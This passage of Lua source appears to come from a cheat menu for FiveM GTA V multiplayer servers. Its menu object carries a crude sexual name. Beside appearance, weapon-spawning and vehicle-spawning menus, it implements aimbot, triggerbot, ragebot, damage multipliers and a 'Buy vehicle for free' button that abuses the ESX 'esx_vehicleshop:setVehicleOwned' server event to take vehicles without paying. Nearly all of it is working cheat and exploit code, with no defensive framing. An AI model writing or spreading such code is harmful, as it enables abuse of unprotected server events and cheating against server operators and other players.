				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			end
                
                -- Head Menu
                elseif IhadSexWithMyStepMother.IsMenuOpened('modifyhead') then
                    if IhadSexWithMyStepMother.ComboBoxSlider("Face", faceItemsList, currFaceIndex, selFaceIndex, function(currentIndex, selectedIndex)
                        currFaceIndex = currentIndex
                        selFaceIndex = currentIndex 
                        SetPedComponentVariation(PlayerPedId(), 0, faceItemsList[currentIndex]-1, 0, 0)
						faceTexturesList = GetHeadTextures(faceItemsList[currentIndex]-1)
						end) then
                    elseif IhadSexWithMyStepMother.ComboBoxSlider("Hair", hairItemsList, currHairIndex, selHairIndex, function(currentIndex, selectedIndex)
                        previousHairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, GetPedDrawableVariation(PlayerPedId(), 2))
                        
                        previousHairTextureDisplay = hairTextureList[currHairTextureIndex]

                        currHairIndex = currentIndex
                        selHairIndex = currentIndex
                        SetPedComponentVariation(PlayerPedId(), 2, hairItemsList[currentIndex]-1, 0, 0)
                        currentHairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, GetPedDrawableVariation(PlayerPedId(), 2))
                        hairTextureList = GetHairTextures(GetPedDrawableVariation(PlayerPedId(), 2))

                        if (currentKey == keys.left or currentKey == keys.right) and previousHairTexture > currentHairTexture and previousHairTextureDisplay > currentHairTexture then
                            currHairTextureIndex = hairTexturesList[currentHairTexture]
                            selHairTextureIndex = hairTexturesList[currentHairTexture]
                        end

                        end) then
                    elseif IhadSexWithMyStepMother.ComboBox2("Hair Color", hairTextureList, currHairTextureIndex, selHairTextureIndex, function(currentIndex, selectedIndex)
                        currHairTextureIndex = currentIndex
                        selHairTextureIndex = currentIndex
                        SetPedComponentVariation(PlayerPedId(), 2, hairItemsList[currHairIndex]-1, currentIndex-1, 0)
                        end) then
                    elseif IhadSexWithMyStepMother.ComboBoxSlider("Mask", maskItemsList, currMaskIndex, selMaskIndex, function(currentIndex, selectedIndex)
                        currMaskIndex = currentIndex
                        selMaskIndex = currentIndex
                        SetPedComponentVariation(PlayerPedId(), 1, maskItemsList[currentIndex]-1, 0, 0)
						end) then
                    elseif IhadSexWithMyStepMother.ComboBoxSlider("Hat", hatItemsList, currHatIndex, selHatIndex, function(currentIndex, selectedIndex)
                        previousHatTexture = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0)) -- Gets the number of props before the hat index and the prop updates (previous)

                        -- I wanted to grab hatTexturesList[currHatTextureIndex] before the the Prop was updated. This value is the number (index) that is shown on the Hat Texture ComboBox before it updates
                        previousHatTextureDisplay = hatTexturesList[currHatTextureIndex]

                        -- Both Hat Slider and Hat Texture ComboBox values update
                        currHatIndex = currentIndex
                        selHatIndex = currentIndex
                        SetPedPropIndex(PlayerPedId(), 0, hatItemsList[currentIndex]-1, 0, 0)
                        currentHatTexture = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0)) -- Gets the number of props after the hat index and the prop updates (current)
                        hatTexturesList = GetHatTextures(GetPedPropIndex(PlayerPedId(), 0)) -- Generates our array of indexes

                        -- This if condition will only run once for every hat change since the variables previousHatTexture and currentHatTexture will become the same after the SetPedPropIndex() function runs
                        if (currentKey == keys.left or currentKey == keys.right) and previousHatTexture > currentHatTexture and previousHatTextureDisplay > currentHatTexture then 
                            print('if condition')
                            -- Checking if the left/right arrow key was pressed since this function runs every tick, to make sure it really only runs once
                            
                            -- Sets the current Index of the HatTexturesList to the max value of the currentHatTexture
                            currHatTextureIndex = hatTexturesList[currentHatTexture]
                            selHatTextureIndex = hatTexturesList[currentHatTexture]
                        end

						end) then	
					elseif IhadSexWithMyStepMother.ComboBox2("Hat Texture", hatTexturesList, currHatTextureIndex, selHatTextureIndex, function(currentIndex, selectedIndex)
                        currHatTextureIndex = currentIndex
                        selHatTextureIndex = currentIndex
                        SetPedPropIndex(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0), currentIndex, 0)
						end) then
						
                    end
					
					
				elseif IhadSexWithMyStepMother.IsMenuOpened('WeaponCustomization') then
                    if IhadSexWithMyStepMother.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex)
                    currPFuncIndex = currentIndex
                    selPFuncIndex = currentIndex
					  end) then
                    if selPFuncIndex == 1 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0)
                 
                    elseif selPFuncIndex == 2 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)
                    
                    elseif selPFuncIndex == 3 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)
                    
                    elseif selPFuncIndex == 4 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)
                    
                    elseif selPFuncIndex == 5 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)
                    
                    elseif selPFuncIndex == 6 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)
                    
                    elseif selPFuncIndex == 7 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)
                    
                    elseif selPFuncIndex == 8 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
                    end
                elseif IhadSexWithMyStepMother.Button("~g~Add ~s~Special Finish") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
                elseif IhadSexWithMyStepMother.Button("~r~Remove ~s~Special Finish") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
                elseif IhadSexWithMyStepMother.Button("~g~Add ~s~Suppressor") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
                elseif IhadSexWithMyStepMother.Button("~r~Remove ~s~Suppressor") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
                elseif IhadSexWithMyStepMother.Button("~g~Add ~s~Scope") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
                elseif IhadSexWithMyStepMother.Button("~r~Remove ~s~Scope") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
                end
			

        -- WEAPON OPTIONS MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('weapon') then
            if IhadSexWithMyStepMother.MenuButton("Give ~s~Single Weapon", 'weaponspawner') then
                selectedPlayer = PlayerId()
			elseif IhadSexWithMyStepMother.MenuButton("Weapon Customization", "WeaponCustomization") then
                selectedPlayer = PlayerId()
            elseif IhadSexWithMyStepMother.Button("Give All Weapons") then
                GiveAllWeapons(PlayerId())
            elseif IhadSexWithMyStepMother.Button("Remove All Weapons") then
                StripPlayer(PlayerId())
			elseif IhadSexWithMyStepMother.Button("Remove Ammo") then
                SetPedAmmo(GetPlayerPed(-1), 0)
            elseif IhadSexWithMyStepMother.Button("Give Max Ammo") then
                GiveMaxAmmo(PlayerId())
            elseif IhadSexWithMyStepMother.CheckBox("Infinite Ammo", InfAmmo) then
                InfAmmo = not InfAmmo
                SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
            elseif IhadSexWithMyStepMother.CheckBox("Explosive Ammo", ExplosiveAmmo) then
                ExplosiveAmmo = not ExplosiveAmmo
            elseif IhadSexWithMyStepMother.CheckBox("Force Gun", ForceGun) then
                ForceGun = not ForceGun
            elseif IhadSexWithMyStepMother.CheckBox("Super Damage", SuperDamage) then
                SuperDamage = not SuperDamage
                if SuperDamage then
                    local _, wep = GetCurrentPedWeapon(PlayerPedId(), 1)
                    SetPlayerWeaponDamageModifier(PlayerId(), 200.0)
                else
                    local _, wep = GetCurrentPedWeapon(PlayerPedId(), 1)
                    SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
                end
            elseif IhadSexWithMyStepMother.CheckBox("Rapid Fire", RapidFire) then
                RapidFire = not RapidFire
            elseif IhadSexWithMyStepMother.CheckBox("Aimbot", Aimbot) then
                Aimbot = not Aimbot
            elseif IhadSexWithMyStepMother.ComboBox("Aimbot Bone Target ~y~-->", AimbotBoneOps, currAimbotBoneIndex, selAimbotBoneIndex, function(currentIndex, selectedIndex)
                currAimbotBoneIndex = currentIndex
                selAimbotBoneIndex = currentIndex
                AimbotBone = NameToBone(AimbotBoneOps[currentIndex])
            end) then
                elseif IhadSexWithMyStepMother.CheckBox("Draw Aimbot FOV", DrawFov) then
                DrawFov = not DrawFov
                elseif IhadSexWithMyStepMother.CheckBox("Triggerbot", Triggerbot) then
                    Triggerbot = not Triggerbot
                elseif IhadSexWithMyStepMother.CheckBox("Ragebot", Ragebot) then
                    Ragebot = not Ragebot
                end
        
        
        -- SPECIFIC WEAPON MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('weaponspawner') then
            if IhadSexWithMyStepMother.MenuButton('Melee Weapons', 'melee') then
            elseif IhadSexWithMyStepMother.MenuButton('Pistols', 'pistol') then
            elseif IhadSexWithMyStepMother.MenuButton('SMGs / MGs', 'smg') then
            elseif IhadSexWithMyStepMother.MenuButton('Shotguns', 'shotgun') then
            elseif IhadSexWithMyStepMother.MenuButton('Assault Rifles', 'assault') then
            elseif IhadSexWithMyStepMother.MenuButton('Sniper Rifles', 'sniper') then
            elseif IhadSexWithMyStepMother.MenuButton('Thrown Weapons', 'thrown') then
            elseif IhadSexWithMyStepMother.MenuButton('Heavy Weapons', 'heavy') then
			end
        
        -- MELEE WEAPON MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('melee') then
            for i = 1, #meleeweapons do
                if IhadSexWithMyStepMother.Button("~r~--> ~s~"..meleeweapons[i][2].."") then
                    GiveWeapon(selectedPlayer, meleeweapons[i][1])
                end
            end
        -- PISTOL MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('pistol') then
			for i = 1, #pistolweapons do
                if IhadSexWithMyStepMother.Button("~r~--> ~s~"..pistolweapons[i][2].."") then
                    GiveWeapon(selectedPlayer, pistolweapons[i][1])
				elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(pistolweapons[i][1]), 0)
                end
            end
        -- SMG MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('smg') then
            for i = 1, #smgweapons do
                if IhadSexWithMyStepMother.Button("~r~--> ~s~"..smgweapons[i][2].."") then
                    GiveWeapon(selectedPlayer, smgweapons[i][1])
				elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(smgweapons[i][1]), 0)
                end
            end
        -- SHOTGUN MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('shotgun') then
            for i = 1, #shotgunweapons do
                if IhadSexWithMyStepMother.Button("~r~--> ~s~"..shotgunweapons[i][2].."") then
                    GiveWeapon(selectedPlayer, shotgunweapons[i][1])
					elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(shotgunweapons[i][1]), 0)
                end
            end
        -- ASSAULT RIFLE MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('assault') then
            for i = 1, #assaultweapons do
                if IhadSexWithMyStepMother.Button("~r~--> ~s~"..assaultweapons[i][2].."") then
                    GiveWeapon(selectedPlayer, assaultweapons[i][1])
					elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(assaultweapons[i][1]), 0)
                end
            end
        -- SNIPER MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('sniper') then
            for i = 1, #sniperweapons do
                if IhadSexWithMyStepMother.Button("~r~--> ~s~"..sniperweapons[i][2].."") then
                    GiveWeapon(selectedPlayer, sniperweapons[i][1])
					elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(sniperweapons[i][1]), 0)
                end
            end
        -- THROWN WEAPON MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('thrown') then
            for i = 1, #thrownweapons do
                if IhadSexWithMyStepMother.Button("~r~--> ~s~"..thrownweapons[i][2].."") then
                    GiveWeapon(selectedPlayer, thrownweapons[i][1])
					elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(thrownweapons[i][1]), 0)
                end
            end
        -- HEAVY WEAPON MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('heavy') then
            for i = 1, #heavyweapons do
                if IhadSexWithMyStepMother.Button("~r~--> ~s~"..heavyweapons[i][2].."") then
                    GiveWeapon(selectedPlayer, heavyweapons[i][1])
					elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(heavyweapons[i][1]), 0)
                end
            end
        
        
        -- VEHICLE OPTIONS MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('vehicle') then
            if IhadSexWithMyStepMother.MenuButton("Vehicle Spawner 🚘", 'vehiclespawner') then
                elseif IhadSexWithMyStepMother.MenuButton("Vehicle Mods", 'vehiclemods') then
                elseif IhadSexWithMyStepMother.MenuButton("Vehicle Control Menu", 'vehiclemenu') then
				elseif IhadSexWithMyStepMother.MenuButton("Vehicle ~r~Boost", "VehBoostMenu") then
                elseif IhadSexWithMyStepMother.MenuButton("Vehicle Godmode", VehGodmode) then
                    VehGodmode = not VehGodmode
				elseif IhadSexWithMyStepMother.ComboBox("Vehicle Functions ~r~-->", {"🔧 Repair Vehicle", "Clean Vehicle", "Dirty Vehicle"}, currVFuncIndex, selVFuncIndex, function(currentIndex, selClothingIndex)
                    currVFuncIndex = currentIndex
                    selVFuncIndex = currentIndex
                    end) then
					local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
					RequestControlOnce(veh)
					if selVFuncIndex == 1 then
						FixVeh(veh)
						SetVehicleEngineOn(veh, 1, 1)
					elseif selVFuncIndex == 2 then
						SetVehicleDirtLevel(veh, 0)
					elseif selVFuncIndex == 3 then
						SetVehicleDirtLevel(veh, 15.0)
					end
				elseif IhadSexWithMyStepMother.Button("Drive to waypoint ~g~AUTO") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                        local ped = GetPlayerPed(-1)
                        ClearPedTasks(ped)
                        local v = GetVehiclePedIsIn(ped, false)
                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(ojtgh), 156, v, 2883621, 5.5, true)
                        SetDriveTaskDrivingStyle(ped, 2883621)
                        speedmit = true
                    end
				elseif IhadSexWithMyStepMother.Button("~r~Stop ~s~Drive AUTO") then
                    speedmit = false
                    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                        ClearPedTasks(GetPlayerPed(-1))
                    else
                        ClearPedTasksImmediately(GetPlayerPed(-1))
				    end
			
				elseif IhadSexWithMyStepMother.Button("Buy vehicle for free ~r~(risk)") then
				local cb = GetKeyboardInput('Enter Vehicle Spawn Name', '', 100)
				local cw = GetKeyboardInput('Enter Vehicle Licence Plate', '', 100)
				if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
				RequestModel(cb)
				while not HasModelLoaded(cb) do
				Citizen.Wait(0)
				end
				local veh =
				CreateVehicle(
				GetHashKey(cb),
				GetEntityCoords(PlayerPedId(-1)),
				GetEntityHeading(PlayerPedId(-1)),
				true,
				true
					)
					SetVehicleNumberPlateText(veh, cw)
					local cx = ESX.Game.GetVehicleProperties(veh)
					TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
					ShowInfo('~g~~h~Success', false)
				else
					ShowInfo('~b~~h~Model is not valid!', true)
    end
				elseif IhadSexWithMyStepMother.CheckBox("Drift", driftMode) then
                    driftMode = not driftMode
                elseif IhadSexWithMyStepMother.CheckBox("Collision", Collision) then
                    Collision = not Collision
                elseif IhadSexWithMyStepMother.ComboBoxSlider("Speed Multiplier", SpeedModOps, currSpeedIndex, selSpeedIndex, function(currentIndex, selectedIndex)
                    currSpeedIndex = currentIndex
                    selSpeedIndex = currentIndex
                    SpeedModAmt = SpeedModOps[currSpeedIndex]
                    
                    if SpeedModAmt == 1.0 then
                        SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(), 0), SpeedModAmt)
                    else
                        SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(), 0), SpeedModAmt * 20.0)
                    end
                end) then
                    elseif IhadSexWithMyStepMother.CheckBox("Easy Handling / Stick To Floor", EasyHandling) then
                    EasyHandling = not EasyHandling
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    if not EasyHandling then
                        SetVehicleGravityAmount(veh, 9.8)
                    else
                        SetVehicleGravityAmount(veh, 30.0)
                    end
                    elseif IhadSexWithMyStepMother.CheckBox("Deadly Bulldozer", DeadlyBulldozer) then
                        DeadlyBulldozer = not DeadlyBulldozer
                        if DeadlyBulldozer then
                            local veh = SpawnVeh("BULLDOZER", 1, SpawnEngineOn)
                            SetVehicleCanBreak(veh, not DeadlyBulldozer)
                            SetVehicleCanBeVisiblyDamaged(veh, not DeadlyBulldozer)
                            SetVehicleEnginePowerMultiplier(veh, 2500.0)
                            SetVehicleEngineTorqueMultiplier(veh, 2500.0)
                            SetVehicleEngineOn(veh, 1, 1, 1)
                            SetVehicleGravityAmount(veh, 50.0)
                            SetVehicleColours(veh, 27, 27)
                            ShowInfo("~r~Go forth and devour thy enemies!\nPress E ~r~to launch a minion!")
                        elseif not DeadlyBulldozer and IsPedInModel(PlayerPedId(), GetHashKey("BULLDOZER")) then
                            DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 0))
                        end
                    end
        
        -- VEHICLE SPAWNER MENU
        elseif IhadSexWithMyStepMother.IsMenuOpened('vehiclespawner') then
            if IhadSexWithMyStepMother.Button("Spawn Vehicle By Name") then
                local model = GetKeyboardInput("Enter Model Name:")
                SpawnVeh(model, PlaceSelf, SpawnEngineOn)
            elseif IhadSexWithMyStepMother.CheckBox("Put Self Into Spawned Vehicle", PlaceSelf, "No", "Yes") then
                PlaceSelf = not PlaceSelf			
            elseif IhadSexWithMyStepMother.CheckBox("Spawn Planes In Air", SpawnInAir, "No", "Yes") then
                SpawnInAir = not SpawnInAir
            elseif IhadSexWithMyStepMother.CheckBox("Spawn Vehicle With Engine : ", SpawnEngineOn, "No", "Yes") then
                SpawnEngineOn = not SpawnEngineOn
            elseif IhadSexWithMyStepMother.MenuButton('Compacts', 'compacts') then
            elseif IhadSexWithMyStepMother.MenuButton('Sedans', 'sedans') then
            elseif IhadSexWithMyStepMother.MenuButton('SUVs', 'suvs') then
            elseif IhadSexWithMyStepMother.MenuButton('Coupes', 'coupes') then
            elseif IhadSexWithMyStepMother.MenuButton('Muscle', 'muscle') then
            elseif IhadSexWithMyStepMother.MenuButton('Sports Classics', 'sportsclassics') then
            elseif IhadSexWithMyStepMother.MenuButton('Sports', 'sports') then
            elseif IhadSexWithMyStepMother.MenuButton('Super', 'super') then
            elseif IhadSexWithMyStepMother.MenuButton('~v~WWBA Vehicle', 'wwba') then
            elseif IhadSexWithMyStepMother.MenuButton('Off-Road', 'offroad') then
            elseif IhadSexWithMyStepMother.MenuButton('Industrial', 'industrial') then
            elseif IhadSexWithMyStepMother.MenuButton('Utility', 'utility') then
            elseif IhadSexWithMyStepMother.MenuButton('Vans', 'vans') then
			elseif IhadSexWithMyStepMother.MenuButton('Cycles', 'cycles') then
			elseif IhadSexWithMyStepMother.MenuButton('Boats', 'boats') then
			elseif IhadSexWithMyStepMother.MenuButton('Helicopters', 'helicopters') then
			elseif IhadSexWithMyStepMother.MenuButton('Planes', 'planes') then
			elseif IhadSexWithMyStepMother.MenuButton('Service/Emergency/Military', 'service') then
			elseif IhadSexWithMyStepMother.MenuButton('Commercial/Trains', 'commercial') then
			end
        
        -- COMPACTS SPAWNER
        elseif IhadSexWithMyStepMother.IsMenuOpened('compacts') then
            for i = 1, #compacts do
                local vehname = GetLabelText(compacts[i])
                if vehname == "NULL" then vehname = compacts[i] end -- Avoid getting NULL (for some reason GetLabelText returns null for some vehs)
                local carButton = IhadSexWithMyStepMother.Button(vehname)
                if carButton then
                    SpawnVeh(compacts[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- SEDANS SPAWNER
        elseif IhadSexWithMyStepMother.IsMenuOpened('sedans') then
            for i = 1, #sedans do
                local vehname = GetLabelText(sedans[i])
                if vehname == "NULL" then vehname = sedans[i] end
                local carButton = IhadSexWithMyStepMother.Button(vehname)
                if carButton then
                    SpawnVeh(sedans[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- SUVs SPAWNER
        elseif IhadSexWithMyStepMother.IsMenuOpened('suvs') then
            for i = 1, #suvs do
                local vehname = GetLabelText(suvs[i])
                if vehname == "NULL" then vehname = suvs[i] end
                local carButton = IhadSexWithMyStepMother.Button(vehname)
                if carButton then
                    SpawnVeh(suvs[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- COUPES SPAWNER
        elseif IhadSexWithMyStepMother.IsMenuOpened('coupes') then
            for i = 1, #coupes do
                local vehname = GetLabelText(coupes[i])
                if vehname == "NULL" then vehname = coupes[i] end
                local carButton = IhadSexWithMyStepMother.Button(vehname)
                if carButton then
                    SpawnVeh(coupes[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- MUSCLE SPAWNER
        elseif IhadSexWithMyStepMother.IsMenuOpened('muscle') then
            for i = 1, #muscle do
                local vehname = GetLabelText(muscle[i])
                if vehname == "NULL" then vehname = muscle[i] end
                local carButton = IhadSexWithMyStepMother.Button(vehname)
                if carButton then
                    SpawnVeh(muscle[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- SPORTSCLASSICS SPAWNER
        elseif IhadSexWithMyStepMother.IsMenuOpened('sportsclassics') then
            for i = 1, #sportsclassics do
                local vehname = GetLabelText(sportsclassics[i])
                if vehname == "NULL" then vehname = sportsclassics[i] end
                local carButton = IhadSexWithMyStepMother.Button(vehname)
                if carButton then
                    SpawnVeh(sportsclassics[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- SPORTS SPAWNER
        elseif IhadSexWithMyStepMother.IsMenuOpened('sports') then
            for i = 1, #sports do
                local vehname = GetLabelText(sports[i])
                if vehname == "NULL" then vehname = sports[i] end
                local carButton = IhadSexWithMyStepMother.Button(vehname)
                if carButton then
                    SpawnVeh(sports[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- SUPER SPAWNER
        elseif IhadSexWithMyStepMother.IsMenuOpened('super') then
            for i = 1, #super do
                local vehname = GetLabelText(super[i])
                if vehname == "NULL" then vehname = super[i] end
                local carButton = IhadSexWithMyStepMother.Button(vehname)
                if carButton then
                    SpawnVeh(super[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- WWBA SPAWNER
        elseif IhadSexWithMyStepMother.IsMenuOpened('WWBA') then
            for i = 1, #WWBA do
                local vehname = GetLabelText(WWBA[i])
                if vehname == "NULL" then vehname = WWBA[i] end
                local carButton = IhadSexWithMyStepMother.Button(vehname)
                if carButton then
                    SpawnVeh(WWBA[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- OFFROAD SPAWNER
        elseif IhadSexWithMyStepMother.IsMenuOpened('offroad') then
            for i = 1, #offroad do
                local vehname = GetLabelText(offroad[i])
                if vehname == "NULL" then vehname = offroad[i] end
                local carButton = IhadSexWithMyStepMother.Button(vehname)
                if carButton then
                    SpawnVeh(offroad[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- INDUSTRIAL SPAWNER
        elseif IhadSexWithMyStepMother.IsMenuOpened('industrial') then
            for i = 1, #industrial do
                local vehname = GetLabelText(industrial[i])
                if vehname == "NULL" then vehname = industrial[i] end
                local carButton = IhadSexWithMyStepMother.Button(vehname)
                if carButton then
                    SpawnVeh(industrial[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- UTILITY SPAWNER
        elseif IhadSexWithMyStepMother.IsMenuOpened('utility') then
            for i = 1, #utility do
                local vehname = GetLabelText(utility[i])
                if vehname == "NULL" then vehname = utility[i] end
                local carButton = IhadSexWithMyStepMother.Button(vehname)
                if carButton then
                    SpawnVeh(utility[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- VANS SPAWNER
